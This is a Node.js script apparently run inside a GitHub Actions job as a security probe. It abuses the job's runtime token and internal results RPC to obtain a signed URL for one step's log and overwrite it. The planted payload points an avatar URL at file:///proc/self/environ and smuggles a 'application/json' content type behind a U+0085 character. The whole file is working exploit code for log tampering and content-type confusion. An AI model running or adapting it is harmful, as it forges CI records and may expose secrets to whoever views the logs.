import https from 'node:https';
import fs from 'node:fs';

const runtime = process.env.ACTIONS_RUNTIME_TOKEN;
const results = process.env.ACTIONS_RESULTS_URL;
const ghToken = process.env.GITHUB_TOKEN;
const repo = process.env.GITHUB_REPOSITORY;
const publicRun = process.env.GITHUB_RUN_ID;
const claims = JSON.parse(Buffer.from(runtime.split('.')[1], 'base64url'));
const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
const [, run, job] = scope.split(':');
const service = new URL('/twirp/results.services.receiver.Receiver/', results);
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

function request(url, options = {}, body) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, options, res => {
      const parts = [];
      res.on('data', x => parts.push(x));
      res.on('end', () => resolve({status: res.statusCode, headers: res.headers, body: Buffer.concat(parts)}));
    });
    req.on('error', reject);
    req.setTimeout(20000, () => req.destroy(new Error('timeout')));
    if (body) req.write(body);
    req.end();
  });
}

async function rpc(method, doc) {
  const body = Buffer.from(JSON.stringify(doc));
  const response = await request(new URL(method, service), {method: 'POST', headers: {
    authorization: `Bearer ${runtime}`, 'content-type': 'application/json', 'content-length': String(body.length),
  }}, body);
  let data;
  try { data = JSON.parse(response.body); } catch { data = {}; }
  return {status: response.status, data};
}

async function github(path) {
  return request(`https://api.github.com/repos/${repo}${path}`, {headers: {
    authorization: `Bearer ${ghToken}`, accept: 'application/vnd.github.v3+json', 'user-agent': 'step-log-mime-probe',
  }});
}

let publicJob;
for (let i = 0; i < 60 && !publicJob; i++) {
  const res = await github(`/actions/runs/${publicRun}/jobs?filter=all`);
  if (res.status === 200) {
    const data = JSON.parse(res.body);
    publicJob = data.jobs?.find(x => x.name === process.env.GITHUB_JOB)?.id ?? data.jobs?.[0]?.id;
  }
  if (!publicJob) await sleep(250);
}
if (!publicJob) throw new Error('REST job ID unavailable');

let target;
for (let i = 0; i < 60 && !target; i++) {
  const page = await request(`https://github.com/${repo}/actions/runs/${publicRun}/job/${publicJob}`, {headers: {'user-agent': 'step-log-mime-probe'}});
  const html = page.body.toString();
  for (const match of html.matchAll(/<check-step\s+([\s\S]*?)>/g)) {
    const attrs = match[1];
    if (attrs.match(/data-name="([^"]*)"/)?.[1] !== 'Carrier target') continue;
    const stepNo = attrs.match(/data-number="(\d+)"/)?.[1];
    const backendId = attrs.match(/data-external-id="([0-9a-f-]{36})"/)?.[1];
    if (stepNo && backendId) target = {stepNo, backendId};
  }
  if (!target) await sleep(250);
}
if (!target) throw new Error('step backend ID unavailable');

const identity = {workflow_run_backend_id: run, workflow_job_run_backend_id: job, step_backend_id: target.backendId};
const signed = await rpc('GetStepLogsSignedBlobURL', identity);
if (signed.status !== 200 || !signed.data.logs_url) throw new Error(`signed URL ${signed.status}: ${JSON.stringify(signed.data).slice(0, 150)}`);
const repository = `${repo}/actions/jobs/${publicJob}/steps/${target.stepNo}/logs`;
const payload = Buffer.from(JSON.stringify({full_name: repository, owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'}}));
const nel = '\u0085application/json';
const put = await request(signed.data.logs_url, {method: 'PUT', headers: {
  'x-ms-version': '2023-11-03', 'x-ms-blob-type': 'BlockBlob',
  'x-ms-blob-content-type': nel, 'content-type': 'application/octet-stream', 'content-length': String(payload.length),
}}, payload);
const metadata = await rpc('CreateStepLogsMetadata', {...identity, uploaded_at: new Date().toISOString(), line_count: 1});
fs.appendFileSync(process.env.GITHUB_OUTPUT, `job_id=${publicJob}\nstep_no=${target.stepNo}\n`);
const row = {jobId: publicJob, stepNo: target.stepNo, put: put.status, metadata: metadata.status, uploadRsct: new URL(signed.data.logs_url).searchParams.get('rsct')};
console.log('STEP_LOG_MINT', JSON.stringify(row));
console.log(`::notice title=STEP_LOG_MINT::${JSON.stringify(row)}`);
